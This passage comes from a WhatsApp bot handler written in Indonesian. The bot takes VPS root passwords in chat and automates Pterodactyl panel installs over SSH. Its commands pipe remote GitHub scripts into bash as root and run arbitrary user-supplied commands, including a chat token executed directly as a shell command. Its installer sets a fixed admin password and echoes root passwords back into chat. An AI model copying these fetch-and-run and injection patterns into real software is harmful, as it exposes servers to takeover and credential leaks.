                   }
                }
             }
          }
       }, { quoted: contactQ })
       await sleep(2000)
       await sock.relayMessage(nomornya, Msg.message, { messageId: Msg.key.id })
    }
    break
    //═══════════════════════════════════//
    // INSTALL MENU
    case 'installprotect': case 'instalprotectall':
    case 'installprotectall':
    case 'instalprotect':
    case 'ipro': {
        if (!isOwner && !isPremium) return reply(msg.premium)
    
        if (!text || !text.includes('|')) {
            return reply(
                '📋 *Format:*\n' +
                `\`\`\`${prefix}installprotect ip|password\`\`\`\n\n` +
                '📌 *Contoh:*\n' +
                `\`\`\`${prefix}installprotect 123.456.789.0|mypassword\`\`\`\n\n` +
                '⚠️ Ubuntu / Debian only'
            )
        }
    
        const [ipvps, pwvps] = text.split('|').map(v => v.trim())
        if (!ipvps || !pwvps) return reply('❌ IP atau Password kosong')
    
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/
        if (!ipRegex.test(ipvps)) return reply('❌ Format IP tidak valid')
    
        await sock.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } })
    
        const progressMsg = await sock.sendMessage(m.chat, {
            text: `🔗 *Menghubungkan ke VPS...*\n\n🌐 IP: \`${ipvps}\`\n⏳ Mohon tunggu...`
        }, { quoted: m })
    
        try {
            const conn = new Client()
    
            conn.on('ready', async () => {
                await sock.sendMessage(m.chat, {
                    edit: progressMsg.key,
                    text: `✅ *SSH Connected!*\n\n🚀 Memulai instalasi Protect Panel...\n⏳ Running script...`
                }).catch(() => {})
    
                const command = `
curl -sSL https://raw.githubusercontent.com/canceroffc/Silvercancer/refs/heads/main/antirusuh-byitss-custom.sh -o /tmp/install_protection.sh && sudo PROTECT_NAME="Itss Dric" bash /tmp/install_protection.sh`.trim()
    
                const result = await runSSHCommand(conn, command)
                conn.end()
    
                await sock.sendMessage(m.chat, {
                    edit: progressMsg.key,
                    text: `🎉 *INSTALASI SELESAI!*\n\n` +
                          `✅ Protect berhasil di install\n` +
                          `🌐 VPS: \`${ipvps}\`\n\n` +
                          `🛡️ Anti Rusuh by *Itss Dric*`
                })
    
                await sock.sendMessage(m.chat, {
                    text: `📋 *LOG INSTALLATION*\n\n${result.output.slice(-1000)}`
                }, { quoted: progressMsg })
            })
    
            conn.on('error', async (err) => {
                await sock.sendMessage(m.chat, {
                    edit: progressMsg.key,
                    text: `❌ *GAGAL TERHUBUNG KE VPS*\n\n` +
                          `🌐 IP: \`${ipvps}\`\n` +
                          `⚠️ Error: ${err.message}\n\n` +
                          `🔧 Pastikan:\n` +
                          `• IP benar\n` +
                          `• Password benar\n` +
                          `• SSH Port 22 terbuka\n` +
                          `• Login root aktif`
                })
            })
    
            conn.connect({
                host: ipvps,
                port: 22,
                username: 'root',
                password: pwvps,
                readyTimeout: 20000
            })
    
        } catch (err) {
            console.error(err)
            await sock.sendMessage(m.chat, {
                edit: progressMsg.key,
                text: `💥 *SYSTEM ERROR*\n\n${err.message}`
            })
        }
    
        function runSSHCommand(conn, command) {
            return new Promise((resolve) => {
                conn.exec(command, (err, stream) => {
                    if (err) {
                        resolve({ success: false, output: err.message })
                        return
                    }
    
                    let output = ''
                    stream.on('data', d => output += d.toString())
                    stream.stderr.on('data', d => output += d.toString())
                    stream.on('close', () => {
                        resolve({ success: true, output })
                    })
                })
            })
        }
    }
    break
    //═══════════════════════════════════//
    // COMMAND TAMBAHAN UNTUK VPS MANAGEMENT
    case 'vpsinfo': {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text) return reply('Format: .vpsinfo ip|password');
        
        const [ip, pass] = text.split('|').map(i => i.trim());
        if (!ip || !pass) return reply('IP dan Password harus diisi!');
        
        await sock.sendMessage(m.chat, { react: { text: '📊', key: m.key } });
        
        try {
            
            const conn = new Client();
            
            const infoMsg = await sock.sendMessage(m.chat, {
                text: '🔍 *Mengambil info VPS...*\n⏳ Mohon tunggu...'
            }, { quoted: m });
            
            conn.on('ready', () => {
                // Eksekusi multiple commands
                const commands = [
                    'hostnamectl',
                    'free -h',
                    'df -h',
                    'uptime',
                    'uname -a',
                    'curl -s ifconfig.me'
                ];
                
                let allResults = '';
                
                function runNextCommand(index) {
                    if (index >= commands.length) {
                        // Semua command selesai
                        conn.end();
                        
                        sock.sendMessage(m.chat, {
                            edit: infoMsg.key,
                            text: `✅ *INFO VPS COMPLETE*\n\`${ip}\`\n\n${allResults}\n\n📍 *SSH Status:* Connected ✓`
                        });
                        return;
                    }
                    
                    conn.exec(commands[index], (err, stream) => {
                        let output = `📌 *${commands[index]}*\n`;
                        
                        stream.on('data', (data) => {
                            output += data.toString();
                        });
                        
                        stream.on('close', () => {
                            allResults += output + '\n\n';
                            runNextCommand(index + 1);
                        });
                    });
                }
                
                runNextCommand(0);
            });
            
            conn.on('error', (err) => {
                sock.sendMessage(m.chat, {
                    edit: infoMsg.key,
                    text: `❌ Gagal koneksi ke VPS:\n${err.message}`
                });
            });
            
            conn.connect({
                host: ip,
                port: 22,
                username: 'root',
                password: pass,
                readyTimeout: 10000
            });
            
        } catch (error) {
            reply(`Error: ${error.message}`);
        }
    }
    break;
    //═══════════════════════════════════//
    case 'vpscmd': {
        // Eksekusi command custom di VPS
        if (!text.includes('|')) {
            return reply('Format: .vpscmd ip|pass|command\nContoh: .vpscmd 1.2.3.4|mypass|ls -la');
        }
        
        const [ip, pass, ...cmdParts] = text.split('|');
        const command = cmdParts.join('|').trim();
        
        if (!ip || !pass || !command) {
            return reply('IP, Password, dan Command harus diisi!');
        }
        
        try {
            
            const conn = new Client();
            
            const cmdMsg = await sock.sendMessage(m.chat, {
                text: `💻 *Executing Command*\n\`${command}\`\n⏳ Processing...`
            }, { quoted: m });
            
            conn.on('ready', () => {
                conn.exec(command, (err, stream) => {
                    if (err) {
                        sock.sendMessage(m.chat, {
                            edit: cmdMsg.key,
                            text: `❌ Execution Failed:\n${err.message}`
                        });
                        conn.end();
                        return;
                    }
                    
                    let output = '';
                    
                    stream.on('data', (data) => {
                        output += data.toString();
                    });
                    
                    stream.on('close', () => {
                        conn.end();
                        
                        // Potong output jika terlalu panjang
                        const trimmedOutput = output.length > 3500 
                            ? output.slice(0, 3500) + '\n... [truncated]' 
                            : output;
                        
                        sock.sendMessage(m.chat, {
                            edit: cmdMsg.key,
                            text: `✅ *Command Executed*\n\n💻 \`${command}\`\n\n📝 Output:\n\`\`\`${trimmedOutput}\`\`\``
                        });
                    });
                });
            });
            
            conn.on('error', (err) => {
                sock.sendMessage(m.chat, {
                    edit: cmdMsg.key,
                    text: `❌ SSH Connection Failed:\n${err.message}`
                });
            });
            
            conn.connect({
                host: ip,
                port: 22,
                username: 'root',
                password: pass,
                readyTimeout: 10000
            });
            
        } catch (error) {
            reply(`Error: ${error.message}`);
        }
    }
    break;
    //═══════════════════════════════════//
    case "create_domain": {
        if (!isOwner && !isPremium) return reply(msg.owner);
        if (!args[0] || isNaN(args[0])) return reply("Domain tidak ditemukan!");
        
        const dom = Object.keys(global.subdomain);
        const domainIndex = Number(args[0]) - 1;
        
        if (domainIndex < 0 || domainIndex >= dom.length) return reply("Domain tidak ditemukan!");
        if (!args[1] || !args[1].includes("|")) return reply("Hostname/IP tidak ditemukan!");
        
        const tldnya = dom[domainIndex];
        const [host, ip] = args[1].split("|").map(item => item.trim());
        
        async function createSubDomain(host, ip) {
            try {
                const response = await axios.post(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                    {
                        type: "A",
                        name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
                        content: ip.replace(/[^0-9.]/gi, ""),
                        ttl: 3600,
                        priority: 10,
                        proxied: false
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                            "Content-Type": "application/json"
                        }
                    }
                );
    
                const res = response.data;
                if (res.success) {
                    return {
                        success: true,
                        zone: res.result?.zone_name || "Tidak diketahui",
                        name: res.result?.name || "Tidak diketahui",
                        ip: res.result?.content || ip
                    };
                } else {
                    return { success: false, error: "Gagal membuat subdomain" };
                }
            } catch (e) {
                const errorMsg = e.response?.data?.errors?.[0]?.message || e.message || "Terjadi kesalahan";
                return { success: false, error: errorMsg };
            }
        }
    
        const result = await createSubDomain(host.toLowerCase(), ip);
        
        if (result.success) {
            let teks = `✅ *Berhasil membuat subdomain*\n\n🌐 *Subdomain:* ${result.name}\n📌 *IP Server:* ${result.ip}`;
            await reply(teks);
            await reply(result.name);
        } else {
            await reply(`❌ Gagal membuat subdomain:\n${result.error}`);
        }
    }
    break;
    //═══════════════════════════════════//
    case "subdomain": 
    case "subdo": {
        if (!isOwner && !isPremium) return reply(`${msg.owner} SUBDOMAIN!`);
        if (!text || !text.includes("|")) return reply(example("host|ipserver"));
    
        let [host, ip] = text.split("|").map(i => i.trim());
        let dom = Object.keys(global.subdomain);
    
        if (dom.length === 0) return reply("❌ Tidak ada domain yang tersedia saat ini.");
    
        let list = dom.map((i, index) => ({
            header: `(${index + 1}) ${i}`,
            title: `Create Domain ${host}.${i}`,
            id: `${prefix}create_domain ${index + 1} ${host}|${ip}`
        }));
    
        await sock.sendMessage(m.chat, {
            buttons: [{
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Domain' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'PILIH DOMAIN',
                        sections: [{
                            title: '# List Domain Yang Tersedia',
                            highlight_label: ``,
                            rows: list
                        }]
                    })
                }
            }],
            footer: `*${global.footer}*`,
            headerType: 1,
            viewOnce: true,
            text: "◈ *Pilih Domain Yang Tersedia:*",
            contextInfo: {
                isForwarded: true, 
                mentionedJid: [m.sender]
            }
        }, { quoted: m });
    }
    break;
    //═══════════════════════════════════//
    case "installpanel": case 'ip':  {
    if (!isOwner && !isPremium) return reply(msg.premium);

    // Sistem bertahap untuk input
    if (!global.installPanelSessions) global.installPanelSessions = {};
    
    const sessionId = m.sender;
    
    // Jika belum ada session, mulai dari awal
    if (!global.installPanelSessions[sessionId]) {
        global.installPanelSessions[sessionId] = {
            step: 1,
            data: {}
        };
        return reply("🔧 *INSTALL PANEL PTERODACTYL*\n\n📝 Step 1/5\nSilahkan masukkan *IP VPS* Anda\n\nContoh: `103.123.45.67`");
    }

    const session = global.installPanelSessions[sessionId];
    
    // Proses setiap step
    switch(session.step) {
        case 1:
            // Validasi IP
            if (!text || !text.match(/^(\d{1,3}\.){3}\d{1,3}$/)) {
                return reply("❌ Format IP tidak valid!\n\nContoh IP yang benar: `103.123.45.67`");
            }
            session.data.ipvps = text.trim();
            session.step = 2;
            return reply("✅ IP VPS tersimpan!\n\n📝 Step 2/5\nSilahkan masukkan *Password VPS* Anda\n\nContoh: `passwordvps123`");

        case 2:
            if (!text) {
                return reply("❌ Password tidak boleh kosong!\n\nSilahkan masukkan password VPS Anda");
            }
            session.data.pwvps = text.trim();
            session.step = 3;
            return reply("✅ Password VPS tersimpan!\n\n📝 Step 3/5\nSilahkan masukkan *Domain Panel* Anda\n\nContoh: `panel.domain.com`");

        case 3:
            if (!text || !text.includes('.')) {
                return reply("❌ Format domain tidak valid!\n\nContoh domain yang benar: `panel.domain.com`");
            }
            session.data.subdo = text.trim();
            session.step = 4;
            return reply("✅ Domain Panel tersimpan!\n\n📝 Step 4/5\nSilahkan masukkan *Domain Node* Anda\n\nContoh: `node.domain.com`");

        case 4:
            if (!text || !text.includes('.')) {
                return reply("❌ Format domain tidak valid!\n\nContoh domain yang benar: `node.domain.com`");
            }
            session.data.subdoNode = text.trim();
            session.step = 5;
            return reply("✅ Domain Node tersimpan!\n\n📝 Step 5/5\nSilahkan masukkan *RAM Server* dalam MB\n\nContoh: `100000` (untuk 100GB)");

        case 5:
            if (!text || isNaN(text)) {
                return reply("❌ RAM harus berupa angka!\n\nContoh: `100000` (dalam MB)");
            }
            session.data.ramserver = text.trim();
            
            // Konfirmasi data
            const confirmText = `✅ *DATA LENGKAP TERSIMPAN!*

📋 *Ringkasan Data:*
━━━━━━━━━━━━━━━━━━
🖥️ IP VPS: ${session.data.ipvps}
🔐 Password: ${session.data.pwvps}
🌐 Domain Panel: ${session.data.subdo}
🌐 Domain Node: ${session.data.subdoNode}
💾 RAM Server: ${session.data.ramserver} MB
━━━━━━━━━━━━━━━━━━

⚠️ *Peringatan:*
Proses instalasi akan memakan waktu sekitar 5-10 menit. Pastikan data yang Anda masukkan sudah benar!

Ketik *MULAI* untuk memulai instalasi
Ketik *BATAL* untuk membatalkan`;

            session.step = 6;
            return reply(confirmText);

        case 6:
            if (text.toLowerCase() === 'batal') {
                delete global.installPanelSessions[sessionId];
                return reply("❌ Instalasi dibatalkan!");
            }
            
            if (text.toLowerCase() !== 'mulai') {
                return reply("Ketik *MULAI* untuk memulai instalasi atau *BATAL* untuk membatalkan");
            }

            // Ambil data dari session
            const { ipvps, pwvps, subdo, subdoNode, ramserver } = session.data;
            
            // Hapus session
            delete global.installPanelSessions[sessionId];

            // Mulai proses instalasi
            await startInstallation(ipvps, pwvps, subdo, subdoNode, ramserver);
            break;

        default:
            delete global.installPanelSessions[sessionId];
            return reply("❌ Terjadi kesalahan! Silahkan ketik *installpanel* untuk memulai dari awal");
    }

    // Fungsi untuk memulai instalasi
    async function startInstallation(ipvps, pwvps, domainpanel, domainnode, ramserver) {
        const ress = new Client();
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: pwvps
        };

        const randomValue1 = getRandom("");
        const randomValue2 = getRandom("");
        const user = "admin";
        const pass = "admin" + "1406";
        const deletemysql = `\n`;
        const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

        async function instalWings() {
            try {
                ress.exec(commandPanel, (err, stream) => {
                    if (err) {
                        console.error("❌ Gagal menjalankan commandPanel:", err);
                        return reply(`❌ Gagal menjalankan commandPanel.\n\n📌 *Detail:*\n${err.message}`);
                    }

                    stream.on('close', async () => {
                        try {
                            ress.exec('bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)', async (err, stream) => {
                                if (err) {
                                    console.error("❌ Gagal menjalankan createnode.sh:", err);
                                    return reply(`❌ Gagal menjalankan createnode.sh.\n\n📌 *Detail:*\n${err.message}`);
                                }

                                stream.on('close', async () => {
                                    let teks = `✅ *INSTALASI PANEL & NODE BERHASIL!*

━━━━━━━━━━━━━━━━━━━━━━
📦 *Detail Akun Admin Panel:*
━━━━━━━━━━━━━━━━━━━━━━
👤 Username: \`${user}\`
🔐 Password: \`${pass}\`
🌐 Domain Panel: \`${domainpanel}\`
🌐 Domain Node: \`${domainnode}\`
━━━━━━━━━━━━━━━━━━━━━━

⚠️ *Langkah Selanjutnya:*
1️⃣ Login ke panel menggunakan akun di atas
2️⃣ Buka menu *Nodes* → Pilih node *NODES*
3️⃣ Buat *Allocation* untuk node
4️⃣ Ambil *Token Wings* dari Configuration

🚀 *Cara Menjalankan Wings:*
Ketik: *${prefix}startwings* ipvps|pwvps|tokenwings

━━━━━━━━━━━━━━━━━━━━━━
 *Panel & Node Created by Itss Dric`;
                                    
                                    const Msg = generateWAMessageFromContent(m.chat, {
                                        viewOnceMessage: {
                                           message: {
                                              interactiveMessage: {
                                                 header: { title: " " },
                                                 body: { text: teks },
                                                 footer: { text: "Tekan tombol di bawah untuk salin data" },
                                                 nativeFlowMessage: {
                                                    buttons: [
                                                        {
                                                            name: "cta_copy",
                                                            buttonParamsJson: JSON.stringify({
                                                                display_text: "📋 Copy Username",
                                                                copy_code: user
                                                            })
                                                        },
                                                        {
                                                            name: "cta_copy",
                                                            buttonParamsJson: JSON.stringify({
                                                                display_text: "📋 Copy Password",
                                                                copy_code: pass
                                                            })
                                                        },
                                                        {
                                                            name: "cta_url",
                                                            buttonParamsJson: JSON.stringify({
                                                                display_text: "🌐 Login Panel",
                                                                url: domainpanel,
                                                                merchant_url: domainpanel
                                                            })
                                                        }
                                                    ]
                                                 }
                                              }
                                           }
                                        }
                                    }, { quoted: m })
                                    await sleep(2000)
                                    await sock.relayMessage(m.chat, Msg.message, { messageId: Msg.key.id })
                                    //await sock.sendMessage(m.chat, { text: teks }, { quoted: m });
                                    ress.end();
                                });

                                stream.on('data', async (data) => {
                                    console.log(data.toString());
                                    if (data.toString().includes("Masukkan nama lokasi: ")) {
                                        stream.write('South Korea\n');
                                    }
                                    if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                                        stream.write('VPS PREMIUM BY Itss Dric\n');
                                    }
                                    if (data.toString().includes("Masukkan domain: ")) {
                                        stream.write(`${domainnode}\n`);
                                    }
                                    if (data.toString().includes("Masukkan nama node: ")) {
                                        stream.write('NODES\n');
                                    }
                                    if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                                        stream.write(`${ramserver}\n`);
                                    }
                                    if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                                        stream.write(`${ramserver}\n`);
                                    }
                                    if (data.toString().includes("Masukkan Locid: ")) {
                                        stream.write('1\n');
                                    }
                                });

                                stream.stderr.on('data', async (data) => {
                                    console.error("STDERR:", data.toString());
                                });
                            });
                        } catch (error) {
                            console.error("❌ Gagal menjalankan instalWings:", error);
                            reply(`❌ Gagal menjalankan instalWings.\n\n📌 *Detail:*\n${error.message}`);
                            ress.end();
                        }
                    });

                    stream.on('data', async (data) => {
                        console.log("Logger:", data.toString());
                        if (data.toString().includes('Input 0-6')) {
                            stream.write('1\n');
                        }
                        if (data.toString().includes('(y/N)')) {
                            stream.write('y\n');
                        }
                        if (data.toString().includes('Enter the panel address (blank for any address)')) {
                            stream.write(`${domainpanel}\n`);
                        }
                        if (data.toString().includes('Database host username (pterodactyluser)')) {
                            stream.write(`${user}\n`);
                        }
                        if (data.toString().includes('Database host password')) {
                            stream.write(`${pass}\n`);
                        }
                        if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                            stream.write(`${domainnode}\n`);
                        }
                        if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
                            stream.write('admin@gmail.com\n');
                        }
                    });

                    stream.stderr.on('data', (data) => {
                        console.error("STDERR:", data.toString());
                    });
                });
            } catch (error) {
                console.error("❌ Gagal menginstall Wings:", error);
                reply(`❌ Gagal menginstall Wings.\n\n📌 *Detail:*\n${error.message}`);
                ress.end();
            }
        }

        async function instalPanel() {
            try {
                ress.exec(commandPanel, (err, stream) => {
                    if (err) {
                        console.error("❌ Gagal menjalankan commandPanel:", err);
                        return reply(`❌ Gagal menjalankan commandPanel.\n\n📌 *Detail:*\n${err.message}`);
                    }

                    stream.on('close', async () => {
                        try {
                            await instalWings();
                        } catch (error) {
                            console.error("❌ Gagal menjalankan instalWings:", error);
                            reply(`❌ Gagal menjalankan instalWings.\n\n📌 *Detail:*\n${error.message}`);
                            ress.end();
                        }
                    });

                    stream.on('data', async (data) => {
                        console.log("Logger:", data.toString());

                        if (data.toString().includes('Input 0-6')) stream.write('0\n');
                        if (data.toString().includes('(y/N)')) stream.write('y\n');
                        if (data.toString().includes('Database name (panel)')) stream.write(`${user}\n`);
                        if (data.toString().includes('Database username (pterodactyl)')) stream.write(`${user}\n`);
                        if (data.toString().includes('Password (press enter to use randomly generated password)')) stream.write(`${pass}\n`);
                        if (data.toString().includes('Select timezone [Europe/Stockholm]')) stream.write('Asia/Jakarta\n');
                        if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) stream.write('admin@gmail.com\n');
                        if (data.toString().includes('Email address for the initial admin account')) stream.write('admin@gmail.com\n');
                        if (data.toString().includes('Username for the initial admin account')) stream.write(`${user}\n`);
                        if (data.toString().includes('First name for the initial admin account')) stream.write('adm\n');
                        if (data.toString().includes('Last name for the initial admin account')) stream.write('adm\n');
                        if (data.toString().includes('Password for the initial admin account')) stream.write(`${pass}\n`);
                        if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) stream.write(`${domainpanel}\n`);
                        if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) stream.write('y\n');
                        if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) stream.write('y\n');
                        if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) stream.write('1\n');
                        if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) stream.write('y\n');
                        if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) stream.write('y\n');
                        if (data.toString().includes('(yes/no)')) stream.write('yes\n');
                        if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) stream.write('y\n');
                        if (data.toString().includes('Still assume SSL? (y/N)')) stream.write('y\n');
                        if (data.toString().includes('Please read the Terms of Service')) stream.write('y\n');
                        if (data.toString().includes('(A)gree/(C)ancel:')) stream.write('A\n');
                    });

                    stream.stderr.on('data', (data) => {
                        console.error("STDERR:", data.toString());
                    });
                });
            } catch (error) {
                console.error("❌ Gagal menginstall panel:", error);
                reply(`❌ Gagal menginstall panel.\n\n📌 *Detail:*\n${error.message}`);
                ress.end();
            }
        }

        ress.on('ready', async () => {
            try {
                await reply("⏳ Memproses *INSTALL PANEL & NODE*\n\n⚙️ Proses instalasi sedang berjalan...\n⏱️ Estimasi waktu: 5-10 menit\n\n*Mohon tunggu dan jangan spam!*");

                ress.exec(deletemysql, async (err, stream) => {
                    if (err) {
                        console.error("❌ Error saat menjalankan deletemysql:", err);
                        return reply(`❌ Gagal menjalankan perintah deletemysql.\n\n📌 *Detail:*\n${err.message}`);
                    }

                    stream.on('close', async () => {
                        try {
                            await instalPanel();
                        } catch (error) {
                            console.error("❌ Gagal menjalankan instalPanel:", error);
                            return reply(`❌ Gagal menjalankan instalPanel.\n\n📌 *Detail:*\n${error.message}`);
                        }
                    });

                    stream.on('data', async (data) => {
                        console.log("Logger:", data.toString());
                        await stream.write('\t');
                        await stream.write('\n');
                    });

                    stream.stderr.on('data', async (data) => {
                        console.error("STDERR:", data.toString());
                    });
                });
            } catch (error) {
                console.error("❌ Terjadi kesalahan saat memproses install panel:", error);
                return reply(`❌ Terjadi kesalahan saat memproses install panel.\n\n📌 *Detail:*\n${error.message}`);
            }
        });

        ress.on('error', (err) => {
            console.error("❌ SSH Connection Error:", err);
            reply(`❌ Gagal menghubungkan ke server VPS!\n\n📌 *Kemungkinan Penyebab:*\n- IP VPS salah\n- Password VPS salah\n- Port SSH tidak terbuka\n- Firewall memblokir koneksi\n\n*Detail Error:*\n${err.message}`);
        });

        try {
            ress.connect(connSettings);
        } catch (error) {
            console.error("❌ Gagal menghubungkan ke server:", error);
            reply(`❌ Gagal menghubungkan ke server.\n\n📌 *Detail:*\n${error.message}`);
        }
    }
}
break;
    //═══════════════════════════════════//
case "startwings": 
case "configurewings": case 'swings': {
    if (!isOwner && !isPremium) return reply(msg.premium)

    let t = text.split('|');
    if (t.length < 3) return reply(example("ipvps|pwvps|token_node"));

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await reply("*Berhasil menjalankan wings ✅*\nSilahkan cek panel anda 😋");
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                reply('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Kata sandi atau IP tidak valid');
    }).connect(connSettings);
}
break;
    //═══════════════════════════════════//
    case "uninstallpanel": case 'unisntalpanel': case 'unip': {
        if (!isOwner && !isPremium) return (msg.premium)
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
    
        const [ipvps, passwd] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://pterodactyl-installer.se)`;
        const ress = new Client();
    
        ress.on('ready', async () => {
            await reply("Memproses *uninstall panel*\nTunggu 1 menit ke depan hingga proses selesai...");
    
            ress.exec(command, async (err, stream) => {
                if (err) throw err;
    
                stream.on('close', async () => {
                    await reply("Berhasil *uninstall panel* ✅");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
    
                    if (data.toString().includes(`Input 0-6`)) stream.write("6\n");
                    if (data.toString().includes(`(y/N)`)) stream.write("y\n");
                    if (data.toString().includes(`* Choose the panel user (to skip don't input anything):`)) stream.write("\n");
                    if (data.toString().includes(`* Choose the panel database (to skip don't input anything):`)) stream.write("\n");
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                    reply('Terjadi kesalahan saat proses uninstall panel.');
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;      
    //═══════════════════════════════════//
    case "installwings": case 'instalwings': {
      if (!isOwner && !isPremium) return reply(msg.premium)
      if (!text) return reply("❌ Format salah!\nContoh:\n.installwings 123.45.67.89|password|panel.domain.com|node.domain.com");
    
      const [ip, password, domainpanel, domainnode] = text.split("|");
      if (!ip || !password || !domainpanel || !domainnode) {
        return reply("❌ Format salah!\nGunakan: ip|password|domain_panel|domain_node");
      }
      
      const conn = new Client();
      const random = Math.floor(1000 + Math.random() * 9000);
      const emailAcak = `itssdric${random}@gmail.com`;
      const userDB = `cancerdb${Math.floor(1000 + Math.random() * 9000)}`;
      const passDB = `itssdric${Math.floor(1000 + Math.random() * 9000)}`;
    
      reply(`📡 Menghubungkan ke VPS *${ip}*...\n🚀 Memulai proses install Wings...\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailAcak}\n🗃️ DB User: ${userDB}\n🔐 DB Pass: ${passDB}`);
    
      conn.on("ready", () => {
        conn.exec("bash <(curl -s https://pterodactyl-installer.se)", (err, stream) => {
          if (err) {
            conn.end();
            return reply("❌ Gagal menjalankan installer di VPS.");
          }
    
          stream.on("close", (code) => {
            conn.end();
            if (code === 0) {
              reply(`✅ *Wings berhasil diinstall di VPS ${ip}*\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailAcak}\n🗃️ DB: ${userDB} | ${passDB}`);
            } else {
              reply(`⚠️ Installer selesai dengan kode ${code}. Beberapa mungkin gagal. Cek manual VPS.`);
            }
          });
    
          stream.on("data", (data) => {
            const out = data.toString();
            console.log("INSTALL >>", out);
    
            if (out.includes("Input 0-6")) stream.write("1\n");
            if (out.includes("(y/N)")) stream.write("y\n");
            if (out.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
            if (out.includes("Database host username")) stream.write(`${userDB}\n`);
            if (out.includes("Database host password")) stream.write(`${passDB}\n`);
            if (out.includes("Set the FQDN to use for Let's Encrypt")) stream.write(`${domainnode}\n`);
            if (out.includes("Enter email address")) stream.write(`${emailAcak}\n`);
          });
    
          stream.stderr.on("data", (data) => {
            console.error("STDERR:", data.toString());
          });
        });
      }).on("error", (err) => {
        reply(`❌ Gagal konek ke VPS:\n${err.message}`);
      }).connect({
        host: ip,
        port: 22,
        username: 'root',
        password: password,
        readyTimeout: 20000
      });
    }
    break;
    //═══════════════════════════════════//
    case "uninstallwings": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text) return reply("❌ Format salah!\nContoh:\n.uninstallwings 123.45.67.89|passwordvps");
      
        let [ip, password] = text.split("|");
        if (!ip || !password) return reply("❌ Format tidak valid. Gunakan: ip|password");
        
        const conn = new Client();
        reply(`🛠 Menghubungkan ke VPS *${ip}*...\nSedang proses uninstall Wings + reset port...`);
      
        conn.on('ready', () => {
          const script = `
# Hentikan dan hapus Wings
systemctl stop wings
systemctl disable wings
rm -f /etc/systemd/system/wings.service
rm -f /usr/local/bin/wings
rm -rf /etc/pterodactyl
rm -rf /var/lib/pterodactyl
`;
          conn.exec(script, (err, stream) => {
            if (err) {
              conn.end();
              return reply("❌ Gagal mengeksekusi perintah di VPS.");
            }
      
            stream.on('close', (code) => {
              conn.end();
              if (code === 0) {
                reply(`✅ *Wings berhasil dihapus dari VPS ${ip}*\n🧹 Port 8080 & 2022 juga dibersihkan.`);
              } else {
                reply(`⚠️ Selesai dengan kode ${code}. Sebagian mungkin gagal. Periksa manual.`);
              }
            }).on('data', (data) => {
              console.log("STDOUT:", data.toString());
            }).stderr.on('data', (data) => {
              console.error("STDERR:", data.toString());
            });
          });
        }).on('error', (err) => {
          reply(`❌ Tidak bisa konek ke VPS:\n${err.message}`);
        }).connect({
          host: ip,
          port: 22,
          username: 'root',
          password: password,
          readyTimeout: 15000
        });
    }
    break;
    //═══════════════════════════════════//
    case 'installtema': {
        if (!isOwner && !isPremium) return reply(msg.premium);
        let t = text.split('|');
        if (t.length < 2) return reply(`❌ *Format salah!* Penggunaan: ${prefix + command} ipvps|password`);
    
        let ipvps = t[0];
        let passwd = t[1];
    
        await sock.sendMessage(m.chat, { 
            footer: `${global.footer}`, 
            buttons: [ 
                { 
                    buttonId: 'action', 
                    buttonText: { displayText: '⚙️ Pilih Tema' }, 
                    type: 4, 
                    nativeFlowInfo: { 
                        name: 'single_select', 
                        paramsJson: JSON.stringify({ 
                            title: '🎨 Pilih Install Thema Lain', 
                            sections: [ 
                                { 
                                    title: '📜 List Install Thema', 
                                    rows: [ 
                                        { title: '🛠 INSTALLDEPEND', description: '⚡ Install Thema Depend', id: `.installdepend ${ipvps}|${passwd}` }, 
                                        { title: '🌟 INSTALLSTELLAR', description: ' Install Thema Stellar', id: `.installtemastellar ${ipvps}|${passwd}` },
